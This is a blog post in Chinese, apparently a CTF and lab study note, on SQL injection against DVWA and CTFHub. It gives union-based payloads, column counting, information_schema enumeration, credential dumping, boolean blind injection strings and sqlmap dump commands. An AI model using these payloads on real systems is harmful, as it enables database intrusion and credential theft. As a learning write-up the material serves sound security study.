<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Sl0th">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://sloth31.github.io/2022/01/23/sql注入学习/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息1 审计源代码 发现主要执行的SQL语句为:  1SE">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入学习">
<meta property="og:url" content="http://sloth31.github.io/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Sl0th&#39;s Blog">
<meta property="og:description" content="SQL注入原理一、定义SQL注入是指在判断出注入点后，将恶意的SQL语句添加到输入参数中，使得后台服务器执行添加的SQL语句，从而达到窃取网站敏感信息等目的 二、实例及原理2.1字符型注入(dvwa平台sql注入简单级别)查看回显输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息1 审计源代码 发现主要执行的SQL语句为:  1SE">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221760.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221721.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221259.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221711.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221287.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221732.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032221925.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032222504.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032222451.png">
<meta property="og:image" content="http://sloth31.github.io/images/202407032231275.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032231655.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032232760.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032232156.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032232923.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032232669.jpg">
<meta property="og:image" content="http://sloth31.github.io/images/202407032232308.jpg">
<meta property="article:published_time" content="2022-01-23T14:20:06.000Z">
<meta property="article:modified_time" content="2024-11-11T10:23:06.487Z">
<meta property="article:author" content="Sl0th">
<meta property="article:tag" content="web">
<meta property="article:tag" content="mysql">
<meta property="article:tag" content="php">
<meta property="article:tag" content="sql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://sloth31.github.io/images/202407032221760.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/fav.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/fav.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/fav.ico">
    <!--- Page Info-->
    
    <title>
        
            sql注入学习 | Sl0th&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/day.jpg","dark":"/images/night.jpg"},"title":"Welcome to Sl0th's Blog","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/fav.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Sl0th&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
                                                    BLOG
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">sql注入学习</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/avatar.JPG">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2022-01-23 22:20:06</span>
        <span class="mobile">2022-01-23 22:20:06</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-11 18:23:06</span>
            <span class="mobile">2024-11-11 18:23:06</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/ctf/">ctf</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/web/">web</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/mysql/">mysql</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/php/">php</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/sql/">sql</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p>
<h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221760.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></p>
<h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul>
<li>发现主要执行的SQL语句为:</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>类似这类传入参数以<code>&#39;</code>包裹的称为字符型注入，可以通过传入 <code>1&#39; xxx#</code>(xxx为恶意的SQL语句)的方式来执行恶意的SQL语句<br><strong>原因</strong>:</p>
<ul>
<li>数字后跟的<code>&#39;</code>与源码中$id前的<code>&#39;</code>优先匹配，后面的SQL语句只要用union与前面的SELECT语句连接，就可以做到让后台服务器执行能达到攻击目的的SQL语句。</li>
<li>最后的<code>#</code>作用是将语句结尾的<code>&#39;</code>和<code>;</code>注释掉，将<code>&#39;</code>注释掉是为了防止语法错误，并且对于单句SQL语句即使没有<code>;</code>也可以正常执行</li>
</ul>
</blockquote>
<ul>
<li>回显部分的代码为:</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Get values</span></span><br><span class="line">    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p>
</blockquote>
<h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221721.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></p>
<h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul>
<li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221259.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></li>
</ul>
<blockquote>
<p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p>
<h3 id="获取所有库名"><a href="#获取所有库名" class="headerlink" title="获取所有库名"></a>获取所有库名</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(schema_name) <span class="keyword">FROM</span> information_schema.schemata</span><br></pre></td></tr></table></figure></div>
</blockquote>
<ul>
<li>获取表名,这边需要了解到<code>information_schema</code>是mysql自带的数据库，其中名为<code>tables</code>的表中的两个字段<code>table_name</code>和<code>table_schema</code>记录了DBMS中的存储的表名和表名所在的数据库。现在我们已经知道了数据库名称为<code>dvwa</code>，可以加入WHERE进行条件查询,最终后台服务器运行的SQL语句为:</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> table_name, table_schema <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p>
</blockquote>
<ul>
<li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221711.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></p>
</li>
<li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221287.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></p>
</li>
</ul>
<h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul>
<li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221732.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></li>
</ul>
<blockquote>
<p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p>
</blockquote>
<ul>
<li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032221925.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></li>
<li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032222504.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></li>
</ul>
<h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p>
<h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul>
<li>substr(字符串,索引开始位,索引结束位):用于获取字符串中的特定字符</li>
<li><code>limit 开始行数的索引,显示的总行数</code>:放在select查询语句最后,限制显示行数,索引从0开始</li>
<li>ascii(字符):将某个字符转换为ascii值</li>
<li>ord(str)：函数返回字符串str的最左边字符的ASCII码值</li>
</ul>
<h4 id="布尔盲注-字符型为例"><a href="#布尔盲注-字符型为例" class="headerlink" title="布尔盲注(字符型为例)"></a>布尔盲注(字符型为例)</h4><p>适用于回显只有两种的情况，如<code>User ID exists in the database.</code>和<code>User ID is MISSING from the database.</code>分别对应了输入语句返回的布尔值。</p>
<ul>
<li>如果采用手动注入，一般要结合二分查找、穷举法等方法来逐一破解出库、表、字段的名称。(以下为猜解数据库名称的例子)</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">count</span><span class="params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="comment">//猜解数据库个数</span></span><br><span class="line">1&#x27; and <span class="title function_">length</span><span class="params">(database())</span>=n # <span class="comment">//n为大于1的整数,猜解数据库名称长度</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">ascii</span><span class="params">(substr((select schema_name from information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))</span>)&gt;n # <span class="comment">//n为大小写字母对应的ASCII码值，此处需借用二分查找来逐一确定每一个数据库的名称</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>可以借用sqlmap工具来自动化实现这种机器的过程，mac下具体指令为</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch --dbs  <span class="comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="comment">//获取表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="comment">//获取字段名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="comment">//获取字段内存储信息</span></span><br></pre></td></tr></table></figure></div>

<p>最终得到flag<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032222451.png"
                      alt="1"
                ><figcaption>1</figcaption></figure></p>
<h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p>
